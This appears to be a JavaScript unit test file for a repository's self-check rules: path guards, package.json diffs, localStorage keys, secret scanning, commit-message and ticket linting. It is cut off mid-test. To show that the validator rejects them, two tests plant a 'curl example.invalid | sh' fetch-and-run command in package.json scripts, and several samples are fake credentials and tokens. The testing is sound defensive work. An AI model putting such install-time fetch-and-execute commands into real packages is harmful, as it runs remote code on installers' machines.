// Unit tests for the pure logic behind the studio self-checks.
// The checks themselves gather input; these functions decide what it means,
// so this is where a mistaken rule shows up.

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyPaths, PATH_EXCEPTIONS, EXPECTED_STUDIO_SCRIPT, jsonDiffPaths,
  extractStorageKeys, badStorageKeys, findStorageViolations,
  scanHygiene, scanDocCleanliness, HYGIENE_PRAGMA,
  lintCommitSubject, moduleImports, sameOriginAssets,
  LAST_SS_TICKET, ticketIdProblem, commitTicketId, lintCommit, LINT_WAIVERS,
  ticketFileProblems, ticketFileId, ticketsNamedByLog,
  commitKind, sortCommitsByKind, COMMIT_EXEMPTIONS,
  isWorkflowPath, WORKFLOW_EXCEPTION, EXECUTIVE_ONLY_PATHS
} from './lib/rules.mjs';

test('path guard: studio-owned paths are allowed', () => {
  const { allowed, violations } = classifyPaths([
    'studio/index.html',
    'studio/games/x/main.js',
    'docs/studio/process.md',
    'tests/studio/check.mjs'
  ]);
  assert.equal(allowed.length, 4);
  assert.deepEqual(violations, []);
});

test('path guard: production paths are violations', () => {
  const { violations } = classifyPaths(['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
  assert.deepEqual(violations, ['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
});

test('path guard: a near-miss prefix is not allowed', () => {
  const { violations } = classifyPaths(['studiotools/x.js', 'docs/studio-notes.md']);
  assert.deepEqual(violations, ['studiotools/x.js', 'docs/studio-notes.md']);
});

test('path guard: package.json is an exception, not an allowance', () => {
  const { allowed, exceptions, violations } = classifyPaths(['package.json']);
  assert.deepEqual(allowed, []);
  assert.deepEqual(exceptions, ['package.json']);
  assert.deepEqual(violations, []);
});

const BASE_PKG = JSON.stringify({
  name: 'kameko-studio',
  scripts: { test: 'node --test tests/', smoke: 'node scripts/smoke.mjs' },
  devDependencies: { 'puppeteer-core': '^24.10.0' }
}, null, 2);

const withStudioCheck = extra => {
  const pkg = JSON.parse(BASE_PKG);
  pkg.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT;
  return JSON.stringify(Object.assign(pkg, extra), null, 2);
};

const allowPkg = (before, after) => PATH_EXCEPTIONS.find(e => e.path === 'package.json').allow(before, after);

test('package.json exception permits exactly the studio:check entry', () => {
  assert.equal(allowPkg(BASE_PKG, withStudioCheck()), null);
  assert.equal(allowPkg(BASE_PKG, BASE_PKG), null, 'no change at all is also fine');
});

test('package.json exception refuses anything else, however it is smuggled in', () => {
  const dep = JSON.parse(withStudioCheck());
  dep.dependencies = { 'left-pad': '^1.0.0' };
  assert.match(allowPkg(BASE_PKG, JSON.stringify(dep)), /dependencies/);

  const extraScript = JSON.parse(withStudioCheck());
  extraScript.scripts.postinstall = 'curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(extraScript)), /scripts\.postinstall/);

  const removed = JSON.parse(withStudioCheck());
  delete removed.scripts.smoke;
  assert.match(allowPkg(BASE_PKG, JSON.stringify(removed)), /scripts\.smoke/);

  const rewritten = JSON.parse(withStudioCheck());
  rewritten.scripts.test = 'echo skipped';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(rewritten)), /scripts\.test/);
});

test('package.json exception checks the value, not just the key', () => {
  // The exception exists for a script this repo runs, so an arbitrary command
  // appended to it would execute. Key-only matching missed this.
  const hijacked = JSON.parse(withStudioCheck());
  hijacked.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT + ' && curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(hijacked)), /must be exactly/);
});

test('package.json exception rejects unparseable JSON rather than guessing', () => {
  assert.match(allowPkg(BASE_PKG, '{ not json'), /not parseable/);
});

test('jsonDiffPaths reports the dotted path of every difference', () => {
  assert.deepEqual(jsonDiffPaths({ a: 1 }, { a: 1 }), []);
  assert.deepEqual(jsonDiffPaths({ a: { b: 1 } }, { a: { b: 2 } }), ['a.b']);
  assert.deepEqual(jsonDiffPaths({}, { a: 1 }), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: 1 }, {}), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: [1, 2] }, { a: [1, 3] }), ['a']);
});

test('storage keys: literal, concatenated and interpolated forms are all found', () => {
  const code = `
    localStorage.getItem('studio_theme');
    localStorage.setItem("studio_seen", "1");
    sessionStorage.removeItem(\`studio_tmp\`);
    localStorage.setItem('studio_run_' + id, v);
    localStorage.getItem(\`studio_slot_\${n}\`);
  `;
  const keys = extractStorageKeys(code).map(k => k.key);
  assert.deepEqual(keys.sort(), ['studio_run_', 'studio_seen', 'studio_slot_', 'studio_theme', 'studio_tmp'].sort());
  assert.deepEqual(badStorageKeys(code), []);
});

test('storage keys: production keys are caught, including dynamic ones', () => {
  const code = `
    localStorage.getItem('theme');
    localStorage.setItem('riverRunHighScore', s);
    localStorage.setItem('durak_name_' + seat, n);
  `;
  assert.deepEqual(badStorageKeys(code).sort(), ['durak_name_', 'riverRunHighScore', 'theme']);
});

test('storage keys: a fully computed key cannot be verified, so it is reported', () => {
  const code = 'localStorage.setItem(keyFor(slot), v);';
  assert.deepEqual(badStorageKeys(code), ['keyFor(slot']);
});

test('storage: every route to the shared origin is checked, not just three methods', () => {
  // Each of these was waved through by the first version of the rule.
  const cases = {
    "localStorage['kameko_highScore'] = '1';": /bracket access/,
    'delete localStorage.kameko_other;': /delete of a key/,
    'localStorage.clear();': /clear\(\)/,
    'sessionStorage?.clear()': /clear\(\)/,
    "localStorage?.setItem('riverRunHighScore', 1)": /riverRunHighScore/,
    "localStorage . setItem('theme','dark')": /theme/,
    "window.localStorage.setItem('theme','x')": /theme/,
    'const ls = localStorage;': /aliased/
  };
  for (const [code, expected] of Object.entries(cases)) {
    const found = findStorageViolations(code);
    assert.ok(found.length, `expected a violation for: ${code}`);
    assert.match(found.join(' | '), expected);
  }
});

test('storage: a computed key is never trusted, even when it reads like a studio key', () => {
  // `studio_key` here is a variable; its runtime value is unknown.
  assert.match(findStorageViolations('localStorage.setItem(studio_key, v);').join(''), /computed/);
  assert.match(findStorageViolations('localStorage.setItem(keyFor(slot), v);').join(''), /computed/);
  assert.match(findStorageViolations("localStorage[k] = '1';").join(''), /computed/);
});

test('storage: the legitimate patterns stay legitimate', () => {
  assert.deepEqual(findStorageViolations("localStorage.setItem('studio_' + name, v);"), []);
  assert.deepEqual(findStorageViolations('localStorage.getItem(`studio_slot_${n}`);'), []);
  assert.deepEqual(findStorageViolations("localStorage.getItem('studio_visitCount');"), []);
  assert.deepEqual(findStorageViolations("localStorage['studio_theme'] = 'dark';"), []);
});

test('storage: extraction records how the key was written', () => {
  const kinds = code => extractStorageKeys(code).map(k => k.kind);
  assert.deepEqual(kinds("localStorage.getItem('studio_a')"), ['literal']);
  assert.deepEqual(kinds("localStorage.getItem('studio_' + i)"), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(`studio_${i}`)'), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(someVar)'), ['computed']);
});

test('hygiene: catches secrets, identifiers and private paths', () => {
  const cases = {
    'private-key': '-----BEGIN RSA PRIVATE KEY-----',  // studio-check:allow
    'aws-key': 'const k = "AKIAIOSFODNN7EXAMPLE";',  // studio-check:allow
    'bearer-secret': 'const api_key = "sk-abcdef123456789";',  // studio-check:allow
    'gh-token': 'ghp_abcdefghijklmnopqrstuvwxyz0123',  // studio-check:allow
    'email': 'contact someone@example.com for access',  // studio-check:allow
    'phone': 'call 555-867-5309 to confirm',  // studio-check:allow
    'home-path': 'cd /Users/someone/Projects',  // studio-check:allow
    'cloud-drive': 'the notes live in Mobile Documents/whatever',  // studio-check:allow
    'wikilink': 'see [[Some Private Note]] for context',  // studio-check:allow
    'street-address': 'the office at 1600 Pennsylvania Avenue'  // studio-check:allow
  };
  for (const [id, line] of Object.entries(cases)) {
    const found = scanHygiene(line).map(f => f.id);
    assert.ok(found.includes(id), `expected ${id} for: ${line} (got ${found.join(',') || 'nothing'})`);
  }
});

test('hygiene: clean text is clean, and the pragma exempts a quoted rule', () => {
  assert.deepEqual(scanHygiene('The gallery renders a card per studio game.'), []);
  assert.deepEqual(scanHygiene(`a wikilink looks like [[this]] <!-- ${HYGIENE_PRAGMA} -->`), []);  // studio-check:allow
});

test('hygiene: reports the line number', () => {
  const [finding] = scanHygiene('clean\nclean\ncontact someone@example.com');  // studio-check:allow
  assert.equal(finding.line, 3);
});

test('doc cleanliness: stacked corrections and historical sections are caught', () => {
  assert.equal(scanDocCleanliness('## Revision history\n').length, 1);
  assert.equal(scanDocCleanliness('### Superseded approach\n').length, 1);
  assert.equal(scanDocCleanliness('UPDATE: this is no longer true\n').length, 1);
  assert.equal(scanDocCleanliness('**EDIT:** actually we do it the other way\n').length, 1);
});

test('doc cleanliness: a decision record may record being superseded', () => {
  const adr = '# ADR-0007 — something\n\n## Superseded by ADR-0009\n';
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: true }).length, 0);
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: false }).length, 1);
});

test('doc cleanliness: ordinary prose passes', () => {
  const doc = '# Process\n\nOne run is one iteration.\n\n## Ceremonies\n\n- Planning\n';
  assert.deepEqual(scanDocCleanliness(doc), []);
});

test('commit lint: accepts a conventional studio commit', () => {
  assert.equal(lintCommitSubject('feat(studio): SS-003 add the path-guard check'), null);
  assert.equal(lintCommitSubject('docs(studio): SS-001 add the engineering handbook'), null);
});

test('commit lint: rejects a missing scope, ticket or type', () => {
  assert.match(lintCommitSubject('add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat: SS-003 add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): SS-3 add the path guard'), /expected/);
});

test('commit lint: exemption comes from the parent count, not the word "Merge"', () => {
  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks', { parentCount: 2 }), null);
  // Subject matching made the lint opt-out: any message could start with "Merge".
  assert.match(lintCommitSubject('Merge in left-pad'), /expected/);
  assert.match(lintCommitSubject('Merge in left-pad', { parentCount: 1 }), /expected/);
});

test('commit lint: long subjects are rejected', () => {
  assert.match(lintCommitSubject('feat(studio): SS-003 ' + 'x'.repeat(80)), /characters/);
});

// --- The ticket prefix: one sequence, two prefixes, split at 042/043 -----------

test('commit lint: SHS- names every new ticket, from 043', () => {
  assert.equal(lintCommitSubject('feat(studio): SHS-043 retire the old prefix'), null);
  assert.equal(lintCommitSubject('fix(studio): SHS-999 the last three-digit ticket'), null);
});

test('commit lint: SS- is accepted only for the numbers it already issued', () => {
  // Every existing commit keeps passing — history is not renamed.
  assert.equal(lintCommitSubject('docs(studio): SS-042 the last SS- ticket'), null);
  assert.equal(lintCommitSubject('feat(studio): SS-001 the first'), null);
  // A new ticket under the retired prefix is the thing being prevented.
  assert.match(lintCommitSubject('feat(studio): SS-043 a new ticket'), /SS- prefix is retired/);
  assert.match(lintCommitSubject('feat(studio): SS-100 a new ticket'), /SS- prefix is retired/);
});

test('commit lint: SHS- may not reuse a number an SS- ticket holds', () => {
  // One number naming two tickets is the ambiguity the switch removes.
  assert.match(lintCommitSubject('feat(studio): SHS-042 collides with SS-042'), /belong to SS- tickets/);
  assert.match(lintCommitSubject('feat(studio): SHS-001 collides with SS-001'), /belong to SS- tickets/);
  assert.match(lintCommitSubject('feat(studio): SHS-000 no such ticket'), /belong to SS- tickets/);
});

test('commit lint: the prefix is exact — case, spelling and width', () => {
  for (const subject of [
    'feat(studio): shs-043 lower case',
    'feat(studio): Shs-043 mixed case',
    'feat(studio): SH-043 a near miss',
    'feat(studio): SSH-043 a near miss',
    'feat(studio): SHS-43 two digits',
    'feat(studio): SHS-0043 four digits',
    'feat(studio): SHS043 no hyphen'
  ]) assert.match(lintCommitSubject(subject), /expected "type\(studio\): SHS-NNN/, subject);
});

test('commit lint: each rule says which rule it is', () => {
  const messages = new Set([
    lintCommitSubject('feat(studio): SS-043 x'),
    lintCommitSubject('feat(studio): SHS-042 x'),
    lintCommitSubject('feat(studio): SHS-43 x'),
    lintCommitSubject('feat(studio): SHS-043 ' + 'x'.repeat(80))
  ]);
  assert.equal(messages.size, 4);
});

test('ticketIdProblem: the boundary sits between 042 and 043 for both prefixes', () => {
  assert.equal(LAST_SS_TICKET, 42);
  assert.equal(ticketIdProblem('SS', 42), null);
  assert.notEqual(ticketIdProblem('SS', 43), null);
  assert.notEqual(ticketIdProblem('SHS', 42), null);
  assert.equal(ticketIdProblem('SHS', 43), null);
});

// --- Waivers for commits already on the remote --------------------------------

const WAIVED_SHA = '5416876baceb4d4de3ff3b5536a720800e06f9e8';
const WAIVED_SUBJECT = 'docs(studio): SS-042 pin the reviewer to a different model, and cap review rounds';

test('lintCommit: the one waived commit passes, and says why', () => {
  assert.ok(LINT_WAIVERS.has(WAIVED_SHA));
  // The waiver is for a real failure — without it this subject fails.
  assert.match(lintCommitSubject(WAIVED_SUBJECT), /81 characters/);
  const result = lintCommit({ sha: WAIVED_SHA, subject: WAIVED_SUBJECT });
  assert.equal(result.status, 'waived');
  assert.match(result.reason, /SS-042/);
});

test('lintCommit: a waiver is not transferable by copying the subject', () => {
  // The same subject on any other commit is an ordinary failure.
  const other = lintCommit({ sha: 'f'.repeat(40), subject: WAIVED_SUBJECT });
  assert.equal(other.status, 'fail');
  // An abbreviated or altered hash is a different key, not a near match.
  assert.equal(lintCommit({ sha: WAIVED_SHA.slice(0, 7), subject: WAIVED_SUBJECT }).status, 'fail');
  assert.equal(lintCommit({ sha: WAIVED_SHA.toUpperCase(), subject: WAIVED_SUBJECT }).status, 'fail');
  assert.equal(lintCommit({ sha: undefined, subject: WAIVED_SUBJECT }).status, 'fail');
});

test('lintCommit: a conforming commit is ok, a merge is ok, and neither consults the waivers', () => {
  assert.deepEqual(lintCommit({ sha: 'a'.repeat(40), subject: 'feat(studio): SHS-047 x' }), { status: 'ok' });
  assert.deepEqual(lintCommit({ sha: 'a'.repeat(40), parentCount: 2, subject: 'Merge anything' }), { status: 'ok' });
});

test('lintCommit: every waiver is keyed by a full 40-character hash and gives a reason naming its ticket', () => {
  for (const [sha, reason] of LINT_WAIVERS) {
    assert.match(sha, /^[0-9a-f]{40}$/);
    assert.match(reason, /\b(SHS|SS)-\d{3}\b/);
  }
});

// --- Studio commits and arcade commits on the shared main (SHS-055) -----------

test('commitKind: the (studio) scope makes a studio commit, whatever its type or ticket', () => {
  for (const subject of [
    'feat(studio): SHS-055 x',
    'docs(studio): no ticket at all',
    'wip(studio): an unknown type',
    'fix(studio)!: SHS-055 breaking'
  ]) assert.equal(commitKind({ sha: 'a'.repeat(40), subject }).kind, 'studio', subject);
});

test('commitKind: a subject naming a studio ticket is a studio commit, scoped or not', () => {
  // Iteration 05 review: with the scope as the only signal, `fix: SHS-060 …`
  // touching a production file was judged by nothing. Naming the ticket is a
  // claim too, so it puts the commit under the lint and the path guard.
  for (const subject of [
    'fix: SHS-060 clamp the drawer width',
    'feat(river-run): SHS-060 scoped as a game',
    'studio: SHS-055 no parentheses',
    'feat(studios): SHS-055 plural',
    'feat(studio,arcade): SHS-055 two scopes',
    'feat (studio): SHS-055 a space',
    'docs: SS-042 the old prefix'
  ]) assert.equal(commitKind({ sha: 'a'.repeat(40), subject }).kind, 'studio', subject);
});

test('commitKind: anything else is an arcade commit, including near misses of the scope and the ticket', () => {
  for (const subject of [
    'feat: p1-22 ship the thing',
    'chore: make the repo the home',
    'feat(studios): plural, no ticket',
    'feat (studio): a space, no ticket',
    'docs: SHS-55 too few digits',
    'docs: XSHS-055 inside a word',
    'Merge branch studio'
  ]) assert.equal(commitKind({ sha: 'a'.repeat(40), subject }).kind, 'arcade', subject);
});

test('commitKind: a merge is decided by its parents, before its subject', () => {
  assert.equal(commitKind({ sha: 'a'.repeat(40), parentCount: 2, subject: 'feat(studio): SHS-055 x' }).kind, 'merge');
  assert.equal(commitKind({ sha: 'a'.repeat(40), parentCount: 2, subject: 'chore: x' }).kind, 'merge');
});

test('commitKind: the recorded executive commits are exempt by full hash, with their reason', () => {
  for (const short of ['7712cf2', 'fecf7ea', 'd454f79']) {
    const sha = [...COMMIT_EXEMPTIONS.keys()].find(k => k.startsWith(short));
    assert.ok(sha, `${short} is recorded`);
    const kind = commitKind({ sha, subject: 'docs(studio): anything' });
    assert.equal(kind.kind, 'exempt');
    assert.match(kind.reason, /SHS-055/);
    // Only the exact hash: abbreviated or altered, it is an ordinary commit.
    assert.equal(commitKind({ sha: short, subject: 'docs(studio): anything' }).kind, 'studio');
    assert.equal(commitKind({ sha: sha.toUpperCase(), subject: 'docs(studio): anything' }).kind, 'studio');
  }
  for (const [sha, reason] of COMMIT_EXEMPTIONS) {
    assert.match(sha, /^[0-9a-f]{40}$/);
    assert.match(reason, /\b(SHS|SS)-\d{3}\b/);
  }
});

test('commitKind: the executive\'s ADR-0011 commits are exempt by full hash, with their reason (SHS-063)', () => {
  for (const short of ['4121631', '49e21c6', '7492551', '6376a2f', '00bd3a5']) {
    const sha = [...COMMIT_EXEMPTIONS.keys()].find(k => k.startsWith(short));
    assert.ok(sha, `${short} is recorded`);
    const kind = commitKind({ sha, subject: 'docs(studio): anything' });
    assert.equal(kind.kind, 'exempt');
    assert.match(kind.reason, /SHS-063/);
    assert.match(kind.reason, /ADR-0011/);
  }
});

test('commitKind: the executive\'s 2026-09-24 questionnaire answers are exempt by full hash (SHS-071)', () => {
  const sha = [...COMMIT_EXEMPTIONS.keys()].find(k => k.startsWith('1b798e2'));
  assert.ok(sha, '1b798e2 is recorded');
  const kind = commitKind({ sha, subject: 'docs(studio): anything' });
  assert.equal(kind.kind, 'exempt');
  assert.match(kind.reason, /SHS-071/);
});

test('a new unnumbered (studio) commit is a studio commit, so the lint still fails it', () => {
  const commit = { sha: 'b'.repeat(40), subject: 'docs(studio): direction for epic E2' };
  assert.equal(commitKind(commit).kind, 'studio');
  assert.equal(lintCommit(commit).status, 'fail');
});

const C = (subject, paths, extra = {}) => ({ sha: `${subject.length}`.padEnd(40, 'c'), parentCount: 1, subject, paths, ...extra });

test('sortCommitsByKind: only studio commits feed the guard; arcade paths are not its business', () => {
  const r = sortCommitsByKind([
    C('feat(studio): SHS-055 x', ['studio/a.js', 'package.json']),
    C('feat: p1-22 arcade ship', ['games/durak/main.js', 'CLAUDE.md', '.claude/settings.json'])
  ]);
  assert.deepEqual(r.studioPaths.sort(), ['package.json', 'studio/a.js']);
  assert.deepEqual(r.problems, []);
  assert.deepEqual(r.counts, { studio: 1, arcade: 1, merge: 0, exempt: 0 });
});

test('sortCommitsByKind: an arcade commit that changes a studio path is a violation, each path named', () => {
  const r = sortCommitsByKind([C('chore: tidy', ['studio/index.html', 'tests/studio/x.mjs', 'docs/studio/a.md', 'docs/roadmap.md'])]);
  assert.equal(r.problems.length, 3);
  assert.match(r.problems[0], /^studio\/index\.html \(changed by arcade commit .{7}, which is not scoped \(studio\)/);
  assert.deepEqual(r.studioPaths, []);
});

test('sortCommitsByKind: a merge is judged by what it brings in, and a mixed one is a violation', () => {
  const studioOnly = sortCommitsByKind([C('Merge a', ['studio/a.js', 'docs/studio/b.md'], { parentCount: 2 })]);
  assert.deepEqual(studioOnly.problems, []);
  assert.deepEqual(studioOnly.studioPaths, ['studio/a.js', 'docs/studio/b.md']);
  const arcadeOnly = sortCommitsByKind([C('Merge b', ['games/x/a.js'], { parentCount: 2 })]);
  assert.deepEqual(arcadeOnly.problems, []);
  assert.deepEqual(arcadeOnly.studioPaths, []);
  const mixed = sortCommitsByKind([C('Merge c', ['studio/a.js', 'games/x/a.js'], { parentCount: 2 })]);
  assert.equal(mixed.problems.length, 1);
  assert.match(mixed.problems[0], /^merge .{7} changes studio paths and other paths together \(1 and 1\)/);
});

test('sortCommitsByKind: an exempt commit is reported with its reason, never silently passed', () => {
  const [sha, reason] = [...COMMIT_EXEMPTIONS][0];
  const r = sortCommitsByKind([{ sha, parentCount: 1, subject: 'docs: x', paths: ['docs/studio/a.md', '.claude/x'] }]);
  assert.deepEqual(r.problems, []);
  assert.deepEqual(r.studioPaths, []);
  assert.deepEqual(r.notes, [`exempt commit ${sha.slice(0, 7)}: ${reason}`]);
  assert.equal(r.counts.exempt, 1);
});

// --- The studio's own skills and conductor (ADR-0011 §6, SHS-065) --------------

test('isWorkflowPath: the studio\'s skills and its conductor, and nothing beside them', () => {
  for (const p of [
    '.claude/skills/studio-sprint/SKILL.md',
    '.claude/skills/studio-iteration/SKILL.md',
    '.claude/skills/studio-sprint/references/prompts.md',
    '.claude/skills/studio-request/SKILL.md',
    '.claude/workflows/studio-sprint.js'
  ]) assert.equal(isWorkflowPath(p), true, p);
  for (const p of [
    '.claude/skills/ship/SKILL.md',
    '.claude/skills/studios/SKILL.md',
    '.claude/skills/studio-/SKILL.md',
    '.claude/skills/studio-sprint',
    '.claude/skills/studio-x/../ship/SKILL.md',
    '.claude/skills/studio-x/./SKILL.md',
    '.claude/workflows/studio-sprint.js.bak',
    '.claude/workflows/other.js',
    '.claude/settings.json',
    '.github/workflows/checks.yml',
    'x/.claude/skills/studio-sprint/SKILL.md'
  ]) assert.equal(isWorkflowPath(p), false, p);
  assert.match(WORKFLOW_EXCEPTION.reason, /ADR-0011 §6/);
});

test('classifyPaths: the workflow files are an exception of their own; ADR-0011 is executive-only though under docs/studio/', () => {
  const adr = 'docs/studio/decisions/ADR-0011-the-studio-runs-itself.md';
  assert.ok(EXECUTIVE_ONLY_PATHS.some(e => e.path === adr));
  const r = classifyPaths(['.claude/skills/studio-sprint/SKILL.md', '.claude/workflows/studio-sprint.js', '.claude/skills/ship/SKILL.md', '.github/workflows/checks.yml', adr, 'docs/studio/process.md']);
  assert.deepEqual(r.workflow, ['.claude/skills/studio-sprint/SKILL.md', '.claude/workflows/studio-sprint.js']);
  assert.deepEqual(r.allowed, ['docs/studio/process.md']);
  assert.deepEqual(r.exceptions, []);
  assert.deepEqual(r.violations.slice(0, 2), ['.claude/skills/ship/SKILL.md', '.github/workflows/checks.yml']);
  assert.match(r.violations[2], /^docs\/studio\/decisions\/ADR-0011-the-studio-runs-itself\.md \(executive-only: /);
  assert.equal(r.violations.length, 3);
});

test('sortCommitsByKind: a workflow file needs a ticketed studio commit; an arcade commit keeps the arcade\'s rules', () => {
  const ticketed = sortCommitsByKind([C('docs(studio): SHS-065 retro change', ['.claude/skills/studio-sprint/SKILL.md'])]);
  assert.deepEqual(ticketed.problems, []);
  assert.deepEqual(ticketed.studioPaths, ['.claude/skills/studio-sprint/SKILL.md']);
  for (const subject of ['docs(studio): tidy the skill', 'fix: SHS-065 tidy the skill']) {
    const r = sortCommitsByKind([C(subject, ['.claude/workflows/studio-sprint.js', 'studio/a.js'])]);
    assert.equal(r.problems.length, 1, subject);
    assert.match(r.problems[0], /^\.claude\/workflows\/studio-sprint\.js \(changed by studio commit .{7}, which names no ticket: .*ADR-0011 §6/);
    assert.deepEqual(r.studioPaths, ['studio/a.js']);
  }
  const arcade = sortCommitsByKind([C('chore: arcade edit', ['.claude/skills/studio-sprint/SKILL.md'])]);
  assert.deepEqual(arcade.problems, []);
  assert.deepEqual(arcade.studioPaths, []);
});

test('sortCommitsByKind: a merge of studio work that includes a workflow file is a studio merge, not a mixed one', () => {
  const r = sortCommitsByKind([C('Merge studio/x', ['studio/a.js', '.claude/skills/studio-sprint/SKILL.md'], { parentCount: 2 })]);
  assert.deepEqual(r.problems, []);
  assert.deepEqual(r.studioPaths.sort(), ['.claude/skills/studio-sprint/SKILL.md', 'studio/a.js']);
  const onlyWorkflow = sortCommitsByKind([C('Merge y', ['.claude/workflows/studio-sprint.js'], { parentCount: 2 })]);
  assert.deepEqual(onlyWorkflow.studioPaths, []);
  const mixed = sortCommitsByKind([C('Merge z', ['studio/a.js', '.claude/skills/studio-sprint/SKILL.md', 'games/x/a.js'], { parentCount: 2 })]);
  assert.match(mixed.problems[0], /changes studio paths and other paths together \(2 and 1\)/);
});

// --- Every ticket a commit names has exactly one file ---------------------------

const ticketFile = (dir, name, firstLine) => ({ path: `iterations/${dir}/tickets/${name}`, name, firstLine });

test('ticketFileProblems: a whole record has no problems', () => {
  const files = [
    ticketFile('02', 'SS-041-flaky.md', '# SS-041 — A flaky test registered'),
    ticketFile('03', 'SHS-043-prefix.md', '# SHS-043 — New tickets are named SHS-NNN')
  ];
  assert.deepEqual(ticketFileProblems(files, [{ id: 'SS-041', sha: 'a'.repeat(40) }, { id: 'SHS-043', sha: 'b'.repeat(40) }]), []);
});

test('ticketFileProblems: a ticket a commit names with no file is reported, with the commit', () => {
  // The defect this rule exists for: SS-039, SS-041 and SS-042 on main, no files.
  const problems = ticketFileProblems([], [{ id: 'SS-041', sha: '72afe9d' + '0'.repeat(33) }]);
  assert.deepEqual(problems, ['SS-041 is named by commit 72afe9d and has no ticket file']);
});

test('ticketFileProblems: a ticket named by several commits is reported once', () => {
  const named = [{ id: 'SHS-050', sha: 'a'.repeat(40) }, { id: 'SHS-050', sha: 'b'.repeat(40) }];
  assert.equal(ticketFileProblems([], named).length, 1);
});

test('ticketFileProblems: two files for one ticket fail, wherever the second one is', () => {
  const files = [
    ticketFile('02', 'SS-041-flaky.md', '# SS-041 — one'),
    ticketFile('03', 'SS-041-again.md', '# SS-041 — two')
  ];
  assert.match(ticketFileProblems(files, [{ id: 'SS-041', sha: 'a'.repeat(40) }]).join('\n'), /SS-041: 2 ticket files/);
  // …and without any commit naming it: one ID, one file, always.
  assert.match(ticketFileProblems(files, []).join('\n'), /SS-041: 2 ticket files/);
});

test('ticketFileProblems: a file whose heading names another ticket fails', () => {
  const files = [ticketFile('03', 'SHS-050-x.md', '# SHS-051 — a different ticket')];
  assert.match(ticketFileProblems(files, [{ id: 'SHS-050', sha: 'a'.repeat(40) }]).join('\n'), /first line should be "# SHS-050/);
});

test('ticketFileProblems: the heading must be the first line and must name the ID exactly', () => {
  const bad = [
    '',                                   // empty first line, heading further down
    'SHS-050 — no hash',                  // not a heading
    '## SHS-050 — an H2',                 // not the document's title
    '# SHS-0501 — a longer number',       // shares a prefix, is another ID
    '# SHS-050-x — part of a slug',       // the ID followed by more ID-like text
    '# About SHS-050'                     // names it, but is not it
  ];
  for (const firstLine of bad) {
    const problems = ticketFileProblems([ticketFile('03', 'SHS-050-x.md', firstLine)], []);
    assert.match(problems.join('\n'), /first line should be/, JSON.stringify(firstLine));
  }
  assert.deepEqual(ticketFileProblems([ticketFile('03', 'SHS-050-x.md', '# SHS-050 — fine')], []), []);
  assert.deepEqual(ticketFileProblems([ticketFile('03', 'SHS-050-x.md', '#\tSHS-050')], []), []);
});

test('ticketFileProblems: a near-miss file name is no ticket\'s file', () => {
  // `SS-0411-…` shares a prefix with SS-041 and must not satisfy it.
  const files = [ticketFile('02', 'SS-0411-flaky.md', '# SS-0411 — near miss')];
  const problems = ticketFileProblems(files, [{ id: 'SS-041', sha: 'a'.repeat(40) }]).join('\n');
  assert.match(problems, /SS-0411-flaky\.md: not named/);
  assert.match(problems, /SS-041 is named by commit/);
  for (const name of ['ss-041-lower.md', 'SS-041.md', 'SS-041-x.txt.md.bak', 'notes.md', 'SHS-43-x.md']) {
    assert.equal(ticketFileId(name), null, name);
  }
  assert.equal(ticketFileId('SS-041-x.md'), 'SS-041');
});

test('ticketFileProblems: a merge subject names no ticket, so it cannot supply one', () => {
  // The ID comes from the commit below the merge. commitTicketId returns null
  // for a merge subject, and the check skips commits with two parents anyway.
  assert.equal(commitTicketId('Merge ss-099-x: SS-099 something'), null);
});

test('ticketFileProblems: a file name obeys the ticket sequence, as a commit does', () => {
  // Found by review: SHS-041 collides with SS-041, and SS-050 is a new ticket
  // under the retired prefix. Both were accepted as ticket files.
  const collides = ticketFileProblems([ticketFile('03', 'SHS-041-collides.md', '# SHS-041 — x')], []);
  assert.match(collides.join('\n'), /SHS-041-collides\.md: SHS-041: numbers up to 042 belong to SS- tickets/);
  const retired = ticketFileProblems([ticketFile('03', 'SS-050-retired.md', '# SS-050 — x')], []);
  assert.match(retired.join('\n'), /SS-050-retired\.md: SS-050: the SS- prefix is retired/);
  assert.deepEqual(ticketFileProblems([ticketFile('02', 'SS-042-x.md', '# SS-042 — x')], []), []);
});

test('ticketFileProblems: an upper-case extension is not a second, invisible file', () => {
  // `SHS-045-copy.MD` beside the real file: read, and failed for its name.
  const files = [
    ticketFile('03', 'SHS-045-real.md', '# SHS-045 — real'),
    ticketFile('03', 'SHS-045-copy.MD', '# SHS-045 — copy')
  ];
  assert.match(ticketFileProblems(files, []).join('\n'), /SHS-045-copy\.MD: not named/);
});

test('ticketsNamedByLog: a merge names nothing, whatever its subject says', () => {
  const log = [
    { sha: 'a'.repeat(40), parents: 'p1', subject: 'feat(studio): SHS-050 real work' },
    // A merge with a conforming subject: excluded by its parents, not its wording.
    { sha: 'b'.repeat(40), parents: 'p1 p2', subject: 'docs(studio): SHS-099 written by git' },
    { sha: 'c'.repeat(40), parents: '', subject: 'feat(studio): SHS-051 a root commit' },
    { sha: 'd'.repeat(40), parents: 'p1', subject: 'Update README' }
  ];
  assert.deepEqual(ticketsNamedByLog(log).map(n => n.id), ['SHS-050', 'SHS-051']);
});

test('ticketsNamedByLog: a commit names the ticket in its ticket position, and only that one', () => {
  // A mention later in the description is not a claim to be that ticket.
  const named = ticketsNamedByLog([{ sha: 'a'.repeat(40), parents: 'p', subject: 'docs(studio): SHS-046 record the SHS-099 finding' }]);
  assert.deepEqual(named.map(n => n.id), ['SHS-046']);
});

test('commitTicketId: the ID a conforming subject names, and nothing else', () => {
  assert.equal(commitTicketId('feat(studio): SHS-043 x'), 'SHS-043');
  assert.equal(commitTicketId('docs(studio): SS-041 x'), 'SS-041');
  // A merge subject is git's, and names a branch as well as a ticket.
